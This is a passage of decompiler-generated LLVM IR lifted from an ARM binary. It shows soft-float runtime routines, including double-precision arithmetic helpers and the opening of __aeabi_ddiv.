  %tmp = sext i32 %arg3 to i64
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp32 = trunc i64 %arg1 to i32
  store i32 %tmp32, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_15120 = load i32, i32* @r4, align 4
  store i32 %v3_15120, i32* %stack_var_-16, align 4
  %v12_15120 = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v4_1512c = udiv i32 %arg2, 1048576
  %v5_1512c = urem i32 %v4_1512c, 2048
  store i32 %v5_1512c, i32* %r4.global-to-local, align 4
  %v6_1512c = icmp eq i32 %v5_1512c, 0
  br i1 %v6_1512c, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v5_15130 = udiv i32 %arg4, 1048576
  %v6_15130 = urem i32 %v5_15130, 2048
  store i32 %v6_15130, i32* @r5, align 4
  %v7_15130 = icmp eq i32 %v6_15130, 0
  br i1 %v7_15130, label %.thread2, label %bb38

bb38:                                             ; preds = %bb
  %v5_15134 = icmp eq i32 %v5_1512c, 2047
  br i1 %v5_15134, label %.thread2, label %bb39

bb39:                                             ; preds = %bb38
  %v5_15138 = icmp eq i32 %v6_15130, 2047
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb, %bb38, %bb39
  %v0_1513c = phi i1 [ true, %bb ], [ true, %bb38 ], [ %v5_15138, %bb39 ], [ true, %entry ]
  store i32 ptrtoint (i32* @global_var_15140.449 to i32), i32* %lr.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %v0_1513c, i32 ptrtoint (i32* @global_var_15318.447 to i32))
  %v0_15140 = load i32, i32* %r4.global-to-local, align 4
  %v1_15140 = load i32, i32* @r5, align 4
  %v2_15140 = add i32 %v1_15140, %v0_15140
  store i32 %v2_15140, i32* %r4.global-to-local, align 4
  %v2_15144 = xor i32 %arg4, %arg2
  %v1_15148 = load i32, i32* %ip.global-to-local, align 4
  %tmp51 = mul i32 %v1_15148, -2097152
  %v5_15148 = add i32 %tmp51, -1
  %v6_15148 = and i32 %v5_15148, %arg2
  store i32 %v6_15148, i32* %r1.global-to-local, align 4
  %v6_1514c = and i32 %v5_15148, %arg4
  %v5_15150 = mul i32 %arg2, 4096
  %v6_15150 = or i32 %v5_15150, %tmp32
  %v8_15150 = icmp eq i32 %v6_15150, 0
  br i1 %v8_15150, label %.thread3, label %bb40

.thread3:                                         ; preds = %.thread2
  %v1_151585 = or i32 %v6_15148, 1048576
  store i32 %v1_151585, i32* %r1.global-to-local, align 4
  %v1_1515c7 = or i32 %v6_1514c, 1048576
  br label %dec_label_pc_151dc

bb40:                                             ; preds = %.thread2
  %v6_15154 = mul i32 %arg4, 4096
  %v7_15154 = or i32 %v6_15154, %arg3
  %v9_15154 = icmp eq i32 %v7_15154, 0
  %v1_15158 = or i32 %v6_15148, 1048576
  store i32 %v1_15158, i32* %r1.global-to-local, align 4
  %v1_1515c = or i32 %v6_1514c, 1048576
  br i1 %v9_15154, label %dec_label_pc_151dc, label %dec_label_pc_15164

dec_label_pc_15164:                               ; preds = %bb40
  %v6_15164 = mul nuw i64 %tmp, %arg1
  %v7_15164 = udiv i64 %v6_15164, 4294967296
  %v9_15164 = trunc i64 %v6_15164 to i32
  store i32 %v9_15164, i32* %ip.global-to-local, align 4
  %v7_1516c = zext i32 %v1_15158 to i64
  %v11_1516c = mul nuw nsw i64 %v7_1516c, %tmp
  %v12_1516c = add i64 %v11_1516c, %v7_15164
  %v1_15170 = and i32 %v2_15144, -2147483648
  %v10_15174 = zext i32 %v1_1515c to i64
  %v11_15174 = mul nuw i64 %v10_15174, %arg1
  %v12_15174 = add i64 %v12_1516c, %v11_15174
  %v13_15174 = udiv i64 %v12_15174, 4294967296
  %v15_15174 = trunc i64 %v12_15174 to i32
  %v10_1517c = mul nuw i64 %v10_15174, %v7_1516c
  %v11_1517c = add i64 %v13_15174, %v10_1517c
  %v12_1517c = udiv i64 %v11_1517c, 4294967296
  %v13_1517c = trunc i64 %v12_1517c to i32
  %v14_1517c = trunc i64 %v11_1517c to i32
  %v2_15180 = icmp eq i32 %v9_15164, 0
  br i1 %v2_15180, label %bb42, label %bb41

bb41:                                             ; preds = %dec_label_pc_15164
  %v2_15184 = or i32 %v15_15174, 1
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_15164, %bb41
  %storemerge = phi i32 [ %v2_15184, %bb41 ], [ %v15_15174, %dec_label_pc_15164 ]
  %v0_15198 = phi i32 [ %v2_15184, %bb41 ], [ %v15_15174, %dec_label_pc_15164 ]
  store i32 %storemerge, i32* %lr.global-to-local, align 4
  %v1_15188 = add i32 %v2_15140, -255
  %v2_1518c = icmp ugt i32 %v13_1517c, 511
  %v2_15190 = icmp eq i1 %v2_1518c, false
  %v3_15190 = add i32 %v2_15140, -1023
  %v5_15190 = sext i1 %v2_15190 to i32
  %v6_15190 = add i32 %v3_15190, %v5_15190
  store i32 %v6_15190, i32* %r4.global-to-local, align 4
  %v3_15194 = icmp ugt i32 %v1_15188, 768
  br i1 %v3_15194, label %dec_label_pc_151a4, label %dec_label_pc_15198

dec_label_pc_15198:                               ; preds = %bb42
  %v1_15198 = icmp slt i32 %v0_15198, 0
  %v2_15198 = mul i32 %v0_15198, 2
  store i32 %v2_15198, i32* %lr.global-to-local, align 4
  %v3_1519c = mul i32 %v14_1517c, 2
  %v4_1519c = zext i1 %v1_15198 to i32
  %v5_1519c = or i32 %v4_1519c, %v3_1519c
  %v9_1519c = icmp ule i32 %v5_1519c, %v14_1517c
  %v10_1519c = icmp ult i32 %v3_1519c, %v14_1517c
  %v11_1519c = select i1 %v1_15198, i1 %v9_1519c, i1 %v10_1519c
  %v3_151a025 = mul nuw nsw i64 %v12_1517c, 2
  %v3_151a0 = trunc i64 %v3_151a025 to i32
  %v4_151a0 = zext i1 %v11_1519c to i32
  %v5_151a0 = or i32 %v4_151a0, %v3_151a0
  br label %dec_label_pc_151a4

dec_label_pc_151a4:                               ; preds = %bb42, %dec_label_pc_15198
  %v0_151b4 = phi i32 [ %v0_15198, %bb42 ], [ %v2_15198, %dec_label_pc_15198 ]
  %v0_151ac = phi i32 [ %v14_1517c, %bb42 ], [ %v5_1519c, %dec_label_pc_15198 ]
  %v1_151a4 = phi i32 [ %v13_1517c, %bb42 ], [ %v5_151a0, %dec_label_pc_15198 ]
  %v4_151a4 = mul i32 %v1_151a4, 2048
  %v4_151a8 = udiv i32 %v0_151ac, 2097152
  %v5_151a4 = or i32 %v4_151a8, %v1_15170
  %v5_151a8 = or i32 %v5_151a4, %v4_151a4
  store i32 %v5_151a8, i32* %r1.global-to-local, align 4
  %v3_151ac = mul i32 %v0_151ac, 2048
  %v4_151b0 = udiv i32 %v0_151b4, 2097152
  %v5_151b0 = or i32 %v3_151ac, %v4_151b0
  store i32 %v5_151b0, i32* %r0.global-to-local, align 4
  %v3_151b4 = mul i32 %v0_151b4, 2048
  store i32 %v3_151b4, i32* %lr.global-to-local, align 4
  %v1_151b8 = add i32 %v6_15190, -253
  store i32 %v1_151b8, i32* %ip.global-to-local, align 4
  %v2_151b8 = icmp ugt i32 %v6_15190, 252
  %v7_151b8 = icmp eq i32 %v6_15190, 253
  %v2_151bc = xor i1 %v7_151b8, true
  %v3_151bc = and i1 %v2_151b8, %v2_151bc
  br i1 %v3_151bc, label %bb43, label %bb44

bb43:                                             ; preds = %dec_label_pc_151a4
  %v6_151bc = icmp ugt i32 %v1_151b8, 1791
  %v11_151bc = icmp eq i32 %v1_151b8, 1792
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_151a4, %bb43
  %v1_151c0 = phi i1 [ %v7_151b8, %dec_label_pc_151a4 ], [ %v11_151bc, %bb43 ]
  %v0_151c0 = phi i1 [ %v2_151b8, %dec_label_pc_151a4 ], [ %v6_151bc, %bb43 ]
  %v2_151c0 = xor i1 %v1_151c0, true
  %v3_151c0 = and i1 %v0_151c0, %v2_151c0
  call void @__pseudo_cond_branch(i1 %v3_151c0, i32 ptrtoint (i32* @global_var_1520c.448 to i32))
  %v0_151c4 = load i32, i32* %lr.global-to-local, align 4
  %v2_151c4 = icmp slt i32 %v0_151c4, 0
  %v6_151c4 = icmp eq i32 %v0_151c4, -2147483648
  %v1_151c8 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_151c4, label %bb45, label %._crit_edge

bb45:                                             ; preds = %bb44
  %v2_151c8 = urem i32 %v1_151c8, 2
  %v3_151c8 = icmp ne i32 %v2_151c8, 0
  %v4_151c8 = udiv i32 %v1_151c8, 2
  store i32 %v4_151c8, i32* %lr.global-to-local, align 4
  br label %._crit_edge

._crit_edge:                                      ; preds = %bb44, %bb45
  %v1_151cc = phi i1 [ %v3_151c8, %bb45 ], [ %v2_151c4, %bb44 ]
  %v2_151cc = zext i1 %v1_151cc to i32
  %v3_151cc = add i32 %v2_151cc, %v1_151c8
  store i32 %v3_151cc, i32* %r0.global-to-local, align 4
  %v0_151d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_151d0 = load i32, i32* %r4.global-to-local, align 4
  %v2_151d0 = and i32 %v1_151d0, 4096
  %v3_151d0 = icmp ne i32 %v2_151d0, 0
  %v4_151d0 = mul i32 %v1_151d0, 1048576
  %v6_151d0 = add i32 %v4_151d0, %v0_151d0
  %v7_151d0 = zext i1 %v3_151d0 to i32
  %v8_151d0 = add i32 %v7_151d0, %v6_151d0
  store i32 %v8_151d0, i32* %r1.global-to-local, align 4
  %v2_151d4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_151d4, i32* %r4.global-to-local, align 4
  store i32 %v12_15120, i32* %lr.global-to-local, align 4
  ret i32 %v3_151cc

dec_label_pc_151dc:                               ; preds = %.thread3, %bb40
  %v1_151e8 = phi i32 [ %v1_1515c7, %.thread3 ], [ %v1_1515c, %bb40 ]
  %v1_151e0 = phi i32 [ %v1_151585, %.thread3 ], [ %v1_15158, %bb40 ]
  %v1_151dc = and i32 %v2_15144, -2147483648
  %v2_151e0 = or i32 %v1_151e0, %v1_151dc
  %v4_151e41 = or i64 %tmp, %arg1
  %v4_151e4 = trunc i64 %v4_151e41 to i32
  store i32 %v4_151e4, i32* %r0.global-to-local, align 4
  %v2_151e8 = xor i32 %v2_151e0, %v1_151e8
  store i32 %v2_151e8, i32* %r1.global-to-local, align 4
  %v4_151ec = udiv i32 %v1_15148, 2
  %v5_151ec = sub i32 %v2_15140, %v4_151ec
  store i32 %v5_151ec, i32* %r4.global-to-local, align 4
  %v7_151ec = sub i32 0, %v5_151ec
  %v8_151ec = and i32 %v2_15140, %v7_151ec
  %v11_151ec = icmp eq i32 %v2_15140, %v4_151ec
  %v7_151f0 = icmp sgt i32 %v2_15140, %v4_151ec
  br i1 %v7_151f0, label %bb46, label %bb47

bb46:                                             ; preds = %dec_label_pc_151dc
  %v10_151f0 = sub i32 %v1_15148, %v5_151ec
  %v12_151f0 = xor i32 %v5_151ec, %v1_15148
  %v13_151f0 = xor i32 %v10_151f0, %v1_15148
  %v14_151f0 = and i32 %v13_151f0, %v12_151f0
  %v17_151f0 = icmp eq i32 %v1_15148, %v5_151ec
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_151dc, %bb46
  %v3_151fc.in = phi i32 [ %v8_151ec, %dec_label_pc_151dc ], [ %v14_151f0, %bb46 ]
  %v2_151fc.in = phi i32 [ %v5_151ec, %dec_label_pc_151dc ], [ %v10_151f0, %bb46 ]
  %v1_151fc = phi i1 [ %v11_151ec, %dec_label_pc_151dc ], [ %v17_151f0, %bb46 ]
  %v2_151fc = icmp slt i32 %v2_151fc.in, 0
  %v3_151fc = icmp slt i32 %v3_151fc.in, 0
  %v3_151f4 = xor i1 %v3_151fc, %v2_151fc
  %v4_151f4 = or i1 %v1_151fc, %v3_151f4
  br i1 %v4_151f4, label %._crit_edge23, label %bb48

._crit_edge23:                                    ; preds = %bb47
  %v0_151fc.pre = load i32, i32* %lr.global-to-local, align 4
  br label %bb49

bb48:                                             ; preds = %bb47
  %v9_151f430 = mul i32 %v5_151ec, 1048576
  %v10_151f431 = or i32 %v2_151e8, %v9_151f430
  store i32 %v10_151f431, i32* %r1.global-to-local, align 4
  %v7_151f8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v7_151f8, i32* %r4.global-to-local, align 4
  store i32 %v12_15120, i32* %lr.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %._crit_edge23, %bb48
  %v0_151fc = phi i32 [ %v0_151fc.pre, %._crit_edge23 ], [ %v12_15120, %bb48 ]
  %v6_151fc = xor i1 %v4_151f4, true
  call void @__pseudo_cond_branch(i1 %v6_151fc, i32 %v0_151fc)
  %v0_15200 = load i32, i32* %r1.global-to-local, align 4
  %v1_15200 = or i32 %v0_15200, 1048576
  store i32 %v1_15200, i32* %r1.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_15208 = load i32, i32* %r4.global-to-local, align 4
  %v1_15208 = add i32 %v0_15208, -1
  store i32 %v1_15208, i32* %r4.global-to-local, align 4
  ret i32 %v4_151e4

; uselistorder directives
  uselistorder i32 %v5_151ec, { 1, 0, 5, 3, 4, 2, 6 }
  uselistorder i32 %v4_151ec, { 2, 1, 0 }
  uselistorder i32 %v1_151c8, { 2, 0, 1 }
  uselistorder i32 %v0_151c4, { 1, 0 }
  uselistorder i1 %v7_151b8, { 1, 0 }
  uselistorder i32 %v2_15198, { 1, 0 }
  uselistorder i1 %v1_15198, { 1, 0 }
  uselistorder i32 %v6_15190, { 0, 2, 1, 3 }
  uselistorder i32 %v0_15198, { 1, 0, 2 }
  uselistorder i32 %v14_1517c, { 1, 3, 2, 0 }
  uselistorder i64 %v11_1517c, { 1, 0 }
  uselistorder i64 %v12_15174, { 1, 0 }
  uselistorder i64 %v10_15174, { 1, 0 }
  uselistorder i64 %v7_1516c, { 1, 0 }
  uselistorder i64 %v6_15164, { 1, 0 }
  uselistorder i32 %v6_1514c, { 1, 0 }
  uselistorder i32 %v6_15148, { 1, 0, 2 }
  uselistorder i32 %v1_15148, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 %v2_15140, { 4, 3, 0, 2, 1, 5, 6 }
  uselistorder i32 %v6_15130, { 2, 1, 0 }
  uselistorder i32 %v5_1512c, { 2, 1, 0 }
  uselistorder i32 %v12_15120, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 1, 9, 10, 2, 3, 4, 5, 6, 8, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i32 %arg4, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_151dc, { 1, 0 }
  uselistorder label %._crit_edge, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_151a4, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %.thread2, { 3, 2, 1, 0 }
}

define i32 @function_1520c() local_unnamed_addr {
dec_label_pc_1520c:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_16 = alloca i32, align 4
  %v0_1520c = load i1, i1* @cpsr_z, align 1
  %v1_1520c = load i1, i1* @cpsr_n, align 1
  %v2_1520c = load i1, i1* @cpsr_v, align 1
  %v3_1520c = xor i1 %v1_1520c, %v2_1520c
  %v4_1520c = or i1 %v0_1520c, %v3_1520c
  br i1 %v4_1520c, label %dec_label_pc_15210, label %dec_label_pc_15388

dec_label_pc_15210:                               ; preds = %dec_label_pc_1520c
  %v0_15210 = load i32, i32* @r4, align 4
  %v4_15210 = add i32 %v0_15210, 54
  %v6_15210 = sub i32 0, %v0_15210
  %v7_15210 = and i32 %v4_15210, %v6_15210
  %v8_15210 = icmp slt i32 %v7_15210, 0
  %v9_15210 = icmp slt i32 %v4_15210, 0
  %v10_15210 = icmp eq i32 %v4_15210, 0
  %v7_15214 = icmp sgt i32 %v0_15210, -54
  br i1 %v7_15214, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_15210
  store i32 0, i32* @r0, align 4
  %v8_15218 = load i32, i32* @r1, align 4
  %v9_15218 = and i32 %v8_15218, -2147483648
  store i32 %v9_15218, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_15210, %bb
  %v4_15220 = xor i1 %v9_15210, %v8_15210
  %v5_15220 = or i1 %v10_15210, %v4_15220
  call void @__pseudo_cond_branch(i1 %v5_15220, i32 %tmp7)
  %v0_15224 = load i32, i32* @r4, align 4
  %v1_15224 = sub i32 0, %v0_15224
  %v2_15228 = sub i32 -32, %v0_15224
  %v4_15228 = add i32 %v0_15224, 31
  %v5_15228 = and i32 %v4_15228, %v1_15224
  %v6_15228 = icmp slt i32 %v5_15228, 0
  store i1 %v6_15228, i1* @cpsr_v, align 1
  %v6_1522c = icmp slt i32 %v1_15224, 32
  br i1 %v6_1522c, label %dec_label_pc_15230, label %dec_label_pc_1529c

dec_label_pc_15230:                               ; preds = %.thread1
  %v1_15230 = add i32 %v2_15228, 12
  %v8_15234 = icmp sgt i32 %v1_15230, 0
  br i1 %v8_15234, label %dec_label_pc_1526c, label %dec_label_pc_15238

dec_label_pc_15238:                               ; preds = %dec_label_pc_15230
  %v1_15238 = add i32 %v2_15228, 32
  %v1_1523c = sub i32 0, %v2_15228
  %v0_15240 = load i32, i32* @r0, align 4
  %v6_15240 = shl i32 %v0_15240, %v1_1523c
  %v2_15244 = add i32 %v2_15228, 31
  %v3_15244 = shl i32 1, %v2_15244
  %v6_15244 = lshr i32 %v0_15240, %v1_15238
  %v1_15248 = load i32, i32* @r1, align 4
  %v7_15248 = shl i32 %v1_15248, %v1_1523c
  %v8_15248 = or i32 %v7_15248, %v6_15244
  %v1_1524c = and i32 %v1_15248, -2147483648
  %tmp = bitcast i32 %v1_15248 to float
  %tmp19 = call float @fabsf(float %tmp)
  %v1_15250 = bitcast float %tmp19 to i32
  %tmp20 = icmp slt i32 %v6_15240, 0
  %v4_15254 = zext i1 %tmp20 to i32
  %v5_15254 = add i32 %v8_15248, %v4_15254
  %v5_15258 = and i32 %v1_15250, %v3_15244
  %v6_15258 = icmp ne i32 %v5_15258, 0
  %v7_15258 = lshr i32 %v1_15250, %v1_15238
  %v9_15258 = add i32 %v7_15258, %v1_1524c
  %v10_15258 = zext i1 %v6_15258 to i32
  %v11_15258 = add i32 %v9_15258, %v10_15258
  store i32 %v11_15258, i32* @r1, align 4
  %v19_15258 = add i32 %v11_15258, %v10_15258
  %v20_15258 = xor i32 %v19_15258, %v1_15248
  %v21_15258 = xor i32 %v19_15258, %v7_15258
  %v22_15258 = and i32 %v20_15258, %v21_15258
  %v23_15258 = icmp slt i32 %v22_15258, 0
  store i1 %v23_15258, i1* @cpsr_v, align 1
  %v3_1525c = mul i32 %v6_15240, 2
  %v4_1525c = or i32 %v3_1525c, %tmp7
  %v5_1525c = icmp slt i32 %v4_1525c, 0
  store i1 %v5_1525c, i1* @cpsr_n, align 1
  %v6_1525c = icmp eq i32 %v4_1525c, 0
  store i1 %v6_1525c, i1* @cpsr_z, align 1
  br i1 %v6_1525c, label %bb13, label %bb14

bb13:                                             ; preds = %dec_label_pc_15238
  %tmp21 = sext i1 %tmp20 to i32
  %v6_15260 = add nsw i32 %tmp21, -1
  %v7_15260 = and i32 %v5_15254, %v6_15260
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_15238, %bb13
  %v1_15268 = phi i32 [ %v5_15254, %dec_label_pc_15238 ], [ %v7_15260, %bb13 ]
  %v2_15264 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_15264, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_15268

dec_label_pc_1526c:                               ; preds = %dec_label_pc_15230
  %v1_1526c = sub i32 0, %v2_15228
  %v1_15270 = add i32 %v2_15228, 32
  %v0_15274 = load i32, i32* @r0, align 4
  %v6_15274 = shl i32 %v0_15274, %v1_1526c
  %v6_15278 = lshr i32 %v0_15274, %v1_15270
  %v1_1527c = load i32, i32* @r1, align 4
  %v7_1527c = shl i32 %v1_1527c, %v1_1526c
  %v8_1527c = or i32 %v7_1527c, %v6_15278
  %v1_15280 = and i32 %v1_1527c, -2147483648
  %tmp22 = icmp slt i32 %v6_15274, 0
  %v4_15284 = zext i1 %tmp22 to i32
  %v5_15284 = add i32 %v8_1527c, %v4_15284
  %v6_15284 = icmp ult i32 %v5_15284, %v8_1527c
  %v2_15288 = zext i1 %v6_15284 to i32
  %v3_15288 = or i32 %v2_15288, %v1_15280
  store i32 %v3_15288, i32* @r1, align 4
  %v9_15288 = add nsw i32 %v3_15288, %v2_15288
  %v10_15288 = sub i32 0, %v1_1527c
  %v11_15288 = and i32 %v9_15288, %v10_15288
  %v12_15288 = icmp slt i32 %v11_15288, 0
  store i1 %v12_15288, i1* @cpsr_v, align 1
  %v3_1528c = mul i32 %v6_15274, 2
  %v4_1528c = or i32 %v3_1528c, %tmp7
  %v5_1528c = icmp slt i32 %v4_1528c, 0
  store i1 %v5_1528c, i1* @cpsr_n, align 1
  %v6_1528c = icmp eq i32 %v4_1528c, 0
  store i1 %v6_1528c, i1* @cpsr_z, align 1
  br i1 %v6_1528c, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_1526c
  %tmp23 = sext i1 %tmp22 to i32
  %v6_15290 = add nsw i32 %tmp23, -1
  %v7_15290 = and i32 %v5_15284, %v6_15290
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_1526c, %bb15
  %v1_15298 = phi i32 [ %v5_15284, %dec_label_pc_1526c ], [ %v7_15290, %bb15 ]
  %v2_15294 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_15294, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_15298

dec_label_pc_1529c:                               ; preds = %.thread1
  %v1_1529c = sub i32 32, %v2_15228
  %v1_152a0 = load i32, i32* @r0, align 4
  %v7_152a0 = shl i32 %v1_152a0, %v1_1529c
  %v8_152a0 = or i32 %v7_152a0, %tmp7
  %v6_152a4 = lshr i32 %v1_152a0, %v2_15228
  %v1_152a8 = load i32, i32* @r1, align 4
  %v7_152a8 = shl i32 %v1_152a8, %v1_1529c
  %v8_152a8 = or i32 %v7_152a8, %v6_152a4
  %v6_152ac = lshr i32 %v1_152a8, %v2_15228
  %v1_152b0 = and i32 %v1_152a8, -2147483648
  store i32 %v1_152b0, i32* @r1, align 4
  %v7_152b4 = lshr i32 %v1_152b0, %v2_15228
  %v8_152b4 = sub i32 -1, %v7_152b4
  %v9_152b4 = and i32 %v6_152ac, %v8_152b4
  %tmp24 = icmp slt i32 %v8_152a8, 0
  %v4_152b8 = zext i1 %tmp24 to i32
  %v5_152b8 = add i32 %v4_152b8, %v9_152b4
  %v3_152bc = mul i32 %v8_152a8, 2
  %v4_152bc = or i32 %v8_152a0, %v3_152bc
  %v5_152bc = icmp slt i32 %v4_152bc, 0
  store i1 %v5_152bc, i1* @cpsr_n, align 1
  %v6_152bc = icmp eq i32 %v4_152bc, 0
  store i1 %v6_152bc, i1* @cpsr_z, align 1
  br i1 %v6_152bc, label %bb17, label %bb18

bb17:                                             ; preds = %dec_label_pc_1529c
  %tmp25 = sext i1 %tmp24 to i32
  %v6_152c0 = add nsw i32 %tmp25, -1
  %v7_152c0 = and i32 %v5_152b8, %v6_152c0
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_1529c, %bb17
  %v1_152c8 = phi i32 [ %v5_152b8, %dec_label_pc_1529c ], [ %v7_152c0, %bb17 ]
  %v2_152c4 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_152c4, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_152c8

dec_label_pc_15388:                               ; preds = %dec_label_pc_1520c
  %v0_15388 = load i32, i32* @r1, align 4
  %v1_15388 = and i32 %v0_15388, -2147483648
  %v1_15390 = or i32 %v1_15388, 2146435072
  store i32 %v1_15390, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v5_152b8, { 1, 0 }
  uselistorder i32 %v5_15284, { 1, 0, 2 }
  uselistorder i32 %v8_1527c, { 1, 0 }
  uselistorder i32 %v1_1526c, { 1, 0 }
  uselistorder i32 %v5_15254, { 1, 0 }
  uselistorder i32 %v1_15248, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1523c, { 1, 0 }
  uselistorder i32 %v2_15228, { 5, 6, 7, 9, 0, 1, 2, 3, 4, 8 }
  uselistorder i32 %v1_15224, { 1, 0 }
  uselistorder i32 %v4_15210, { 1, 2, 0 }
  uselistorder i32 %v0_15210, { 1, 0, 2 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
  uselistorder i32 %tmp5, { 2, 1, 0 }
  uselistorder i32 12, { 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 60, 67, 10, 68, 44, 71, 3, 1, 2, 72, 73, 5, 0, 4, 83, 45, 12, 13, 49, 14, 15, 69, 70, 46, 47, 48, 74, 75, 76, 77, 78, 16, 79, 66, 17, 84, 85, 80, 11, 129, 130, 131, 132, 133, 135, 136, 134, 137, 138, 139, 140, 141, 142, 143, 18, 19, 20, 21, 23, 22, 24, 81, 82, 25, 61, 62, 63, 64, 65, 50, 51, 26, 52, 53, 54, 87, 86, 55, 56, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 6, 27, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 125, 118, 119, 120, 121, 122, 123, 124, 126, 127, 28, 128, 9, 57, 58, 7, 59, 88, 8, 89 }
  uselistorder i32 -32, { 4, 3, 5, 6, 7, 11, 12, 8, 13, 14, 0, 9, 2, 10, 1 }
  uselistorder i32 54, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_153a0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_153a0:
  %v1_153a4 = or i32 %arg1, 2146959360
  store i32 %v1_153a4, i32* @r1, align 4
  %v1_153ac = load i32, i32* @r0, align 4
  ret i32 %v1_153ac
}

define i32 @__aeabi_ddiv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_153b0 = load i32, i32* @r4, align 4
  store i32 %v3_153b0, i32* %stack_var_-16, align 4
  %v6_153b0 = load i32, i32* @r5, align 4
  %v9_153b0 = load i32, i32* @r6, align 4
  %v12_153b0 = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v1_153bc = load i32, i32* @r1, align 4
  %v4_153bc = udiv i32 %v1_153bc, 1048576
  %v5_153bc = urem i32 %v4_153bc, 2048
  store i32 %v5_153bc, i32* @r4, align 4
  %v6_153bc = icmp eq i32 %v5_153bc, 0
  br i1 %v6_153bc, label %entry..thread2_crit_edge, label %bb

entry..thread2_crit_edge:                         ; preds = %entry
  %.pre147 = udiv i32 %arg4, 1048576
  br label %.thread2

bb:                                               ; preds = %entry
  %v5_153c0 = udiv i32 %arg4, 1048576
  %v6_153c0 = urem i32 %v5_153c0, 2048
  store i32 %v6_153c0, i32* %r5.global-to-local, align 4
  %v7_153c0 = icmp eq i32 %v6_153c0, 0
  br i1 %v7_153c0, label %.thread1, label %bb90

.thread1:                                         ; preds = %bb
  br label %dec_label_pc_1554c

bb90:                                             ; preds = %bb
  %v5_153c4 = icmp eq i32 %v5_153bc, 2047
  br i1 %v5_153c4, label %.thread2, label %bb91

.thread2:                                         ; preds = %entry..thread2_crit_edge, %bb90
  %.pre145.pre-phi = phi i32 [ %.pre147, %entry..thread2_crit_edge ], [ %v5_153c0, %bb90 ]
  br label %dec_label_pc_1554c

bb91:                                             ; preds = %bb90
  %v5_153c8 = icmp eq i32 %v6_153c0, 2047
  br i1 %v5_153c8, label %dec_label_pc_1554c, label %dec_label_pc_153d0

dec_label_pc_153d0:                               ; preds = %bb91
  %v2_153d0 = sub nsw i32 %v5_153bc, %v6_153c0
  store i32 %v2_153d0, i32* %r4.global-to-local, align 4
  %v2_153d4 = xor i32 %v1_153bc, %arg4
  %v4_153d8 = mul i32 %arg4, 4096
  %v5_153d8 = or i32 %v4_153d8, %arg3
  store i32 %v5_153d8, i32* %r5.global-to-local, align 4
  %v7_153d8 = icmp eq i32 %v5_153d8, 0
